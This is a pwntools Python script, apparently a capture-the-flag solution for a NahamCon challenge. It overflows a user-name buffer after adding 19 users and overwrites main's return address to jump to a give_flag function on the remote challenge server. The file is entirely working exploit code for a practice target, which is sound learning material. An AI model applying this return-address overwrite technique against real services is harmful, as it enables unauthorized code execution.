# RazviOverflow
# Python3

from pwn import *

def add_user(binary, user_name):
	binary.sendline(b"2") # 2 for "insert user" option
	binary.sendline(user_name)

static = ELF("./binary")
give_flag_function_address = p64(static.symbols['give_flag'])
print(u64(give_flag_function_address))
print(hex(u64(give_flag_function_address)))

# And then change its name
change_name = "4"

#binary = process("./binary")
binary = remote("challenge.nahamcon.com", 31980)

# Enter your name, to welcome you
binary.sendline(b"Razvi")

# First we must insert 18 users (could be 17)
for i in range(0,19):
	add_user(binary, "a")

# Change name of user 18
binary.sendline(change_name)
binary.sendline("18")

payload = b"A"*0x28 + give_flag_function_address

# Overwritting the return address of main
binary.sendline(payload)

# Calling exit to execute leave instruction
binary.sendline(b"5") # 5 for "exit" option

'''
with open("input", "wb") as file:
	# Enter your name, to welcome you
	file.write(b"Razvi\n")

	# Adding users
	for i in range(0,19):
		file.write(b"2\n")
		file.write(b"a\n")

	# Change name of user 1
	file.write(b"4\n")
	file.write(b"18\n")
	file.write(payload+b"\n")
	file.write(b"5\n")
'''

binary.interactive()
